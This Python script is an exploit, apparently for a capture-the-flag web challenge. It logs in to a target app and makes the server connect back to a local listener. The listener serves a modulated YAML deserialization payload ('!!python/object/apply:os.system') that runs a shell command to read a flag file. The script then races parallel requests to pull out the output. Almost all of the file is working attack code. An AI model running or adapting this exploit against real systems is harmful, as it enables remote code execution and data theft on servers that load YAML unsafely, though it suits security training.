#!/usr/bin/env python
import requests
import threading
import time
import bitarray
import numpy as np

from sys import argv
from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
from bs4 import BeautifulSoup
from multiprocessing import Process
from socket import gethostbyname, gethostname

bp = 1 / float(1000000)
sp = bp * 2
sr = 1/sp
f = sr * 2
duration = 100


def constellation(a, b):
    if a == 0 and b == 0:
        return 1, 1
    elif a == 0 and b == 1:
        return 1, -1
    elif a == 1 and b == 0:
        return -1, 1
    else:
        return -1, -1


def modulate(msg):
    a = bitarray.bitarray()
    a.fromstring(msg)
    msg = list(map(int, a.tolist()))

    t = np.arange(sp/duration, sp + sp/duration, sp/duration, dtype=np.float)
    m = np.zeros(0).astype(float)
    for i in range(0, len(msg), 2):
        I, Q = constellation(msg[i], msg[i+1])
        y = I * np.cos(2*np.pi*f*t) + Q * np.sin(2*np.pi*f*t)
        m = np.hstack((m, y))
    return m


HOST, PORT = (None, None)  # ("localhost", 8000)
url = None
myip = '127.0.0.1'


def join():
    data = {'username': 'asdf', 'password': 'asdf'}
    r = requests.post(url + 'join.py', data=data)
    return r.text


def login(s):
    data = {'username': 'asdf', 'password': 'asdf'}
    r = s.post(url + 'login.py', data=data)
    return r.text


def view(s):
    r = s.get(url + 'view.py')
    return r.text


def view_idx(s, idx):
    r = s.post(url + 'view.py', data={'idx': str(idx)})
    return r.text


def req(s):
    data = {'host': myip, 'port': '5000'}
    r = s.post(url + 'request.py', data=data)
    return r.text


def create_listener(data):
    def socket_routine():
        s = socket(AF_INET, SOCK_STREAM)
        s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        s.bind(('127.0.0.1', 5000))
        s.listen(1)
        c, addr = s.accept()
        c.sendall(modulate(data))
        c.close()
        s.close()
    t = threading.Thread(target=socket_routine)
    t.start()
    time.sleep(0.5)


def race(s, hs):
    def consume():
        while 1:
            r = requests.get(url, cookies={'gitctfsessid': hs})
            resp = r.text
            if 'XXX' in resp:
                print resp.split('XXX\n')[1][:10]
                break

    def produce():
        while 1:
            view_idx(s, 1)

    t = [Process(target=func)
         for func in [consume, produce, produce, produce]]

    for th in t:
        th.start()

    t[0].join()
    for th in t:
        try:
            th.terminate()
        except Exception:
            pass
    exit(0)


def exploit():
    join()
    s = requests.session()
    s.get(url)
    login(s)
    RCE = '!!python/object/apply:os.system ["echo XXX;/bin/cat /var/ctf/flag"]'
    create_listener(RCE)
    req(s)
    v_text = view(s)
    soup = BeautifulSoup(v_text, 'html.parser')
    hs = soup.find_all('tr')[1].find_all('td')[1].get_text()
    race(s, hs)


if __name__ == '__main__':
    time.sleep(2)
    HOST = argv[1]
    PORT = int(argv[2])
    url = "http://{}:{}/".format(HOST, PORT)
    exploit()
